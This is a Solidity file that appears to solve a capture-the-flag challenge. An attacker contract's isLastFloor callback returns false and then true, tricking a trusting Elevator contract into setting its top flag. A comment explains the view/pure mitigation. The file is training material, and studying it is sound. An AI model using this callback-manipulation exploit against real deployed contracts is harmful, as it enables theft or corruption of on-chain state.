// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Building {
    Elevator public target;
    bool lastFloor = false;

    constructor(address _target) {
        target = Elevator(_target);
    }

    function isLastFloor(uint) public returns (bool) {
        bool result = lastFloor;
        lastFloor = true;
        return result;
    }

    function attack() public {
        target.goTo(1);
    }
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        // need to call isLastFloor = false to continue
        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            // need to call isLastFloor = true to win
            top = building.isLastFloor(floor);
        }
    }
}

/*
Result

You can use the view function modifier on an interface in order to prevent state modifications. 
The pure modifier also prevents functions from modifying the state. 
Make sure you read Solidity's documentation (https://docs.soliditylang.org/en/develop/contracts.html#view-functions) and learn its caveats.

An alternative way to solve this level is to build a view function which returns different results depends on input data but don't modify state, e.g. gasleft().
*/
